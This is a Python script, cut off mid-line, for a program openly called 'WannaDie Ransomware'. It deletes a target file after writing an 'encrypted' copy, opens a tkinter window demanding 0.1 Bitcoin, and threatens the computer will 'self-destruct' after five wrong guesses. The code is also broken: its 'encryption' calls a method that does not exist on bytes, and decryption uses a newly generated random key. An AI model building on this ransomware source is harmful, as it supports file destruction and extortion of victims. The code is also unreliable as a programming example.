```py
import os
import sys
import time
import random
import string
import subprocess
import threading
import pyautogui
import tkinter as tk
from tkinter import messagebox

# Generating a random encryption key
def generate_key(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# Encrypting a file with the generated key
def encrypt_file(file_path, key):
    with open(file_path, 'rb') as file:
        data = file.read()
    encoded_data = data.encode(key)
    with open(f"{file_path}.enc", 'wb') as enc_file:
        enc_file.write(encoded_data)
    os.remove(file_path)

# Decrypting a file with the correct key
def decrypt_file(file_path, key):
    with open(file_path, 'rb') as enc_file:
        data = enc_file.read()
    decoded_data = data.decode(key)
    with open(f"{file_path}.dec", 'wb') as dec_file:
        dec_file.write(decoded_data)
    os.remove(file_path)

# Simulating a file encryption process
def simulate_encryption():
    key = generate_key()
    file_path = "important_file.txt"
    encrypt_file(file_path, key)
    print("Files encrypted with the key:", key)

# Simulating a decryption process with a "decrypt" button
def simulate_decryption():
    key = generate_key()
    file_path = "important_file.enc"
    decrypt_file(file_path, key)
    os.rename(f"{file_path}.dec", file_path[:-4])
    print("Files decrypted with the key:", key)

# Displaying a warning message with a countdown before simulating a computer shutdown
def self_destruct():
    message = "Computer will self-destruct in 5 seconds. Goodbye!"
    countdown = 5
    for i in range(countdown, 0, -1):
        sys.stdout.write('\r' + message.replace('Computer will', f"{i} seconds remaining"))
        sys.stdout.flush()
        time.sleep(1)
    sys.exit(0)

# GUI for the ransomware
class WannaDie:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("WannaDie Ransomware")
        self.root.geometry("400x200")
        self.decrypt_guesses = 0

    def start_ransomware(self):
        # Simulate encrypting files
        simulate_encryption()

        # Display the ransom message and the "Decrypt" button
        tk.Label(self.root, text="Oops! Your files have been encrypted.\nHow to get it back?\nWell, hit the 'Decrypt' button and pay 0.1 Bitcoin.\nYou have 5 guesses before your computer self-destructs.").pack(pady=20)
        self.decrypt_button = tk.Button(self.root, text="Decrypt", command=self.decrypt_files)
        self.decrypt_button.pack(pady=10)
        self.decrypt_button.bind('<Return>', self.decrypt_files)
        self.self_destruct_thread = threading.Thread(target=self.start_countdown)
        self.self_destruct_thread.start()
        self.root.mainloop()

    def decrypt_files(self):
        guess_key = input("Enter the decryption key: ").strip()
        if guess_key == "0123456789abcdef":  # Replace with actual Bitcoin payment verification
            simulate_decryption()
            messagebox.showinfo("Success", "Files have been decrypted. Thank you for your cooperation.")
            sys.exit(0)
        else:
            self.decrypt_guesses += 1
            if self.decrypt_guesses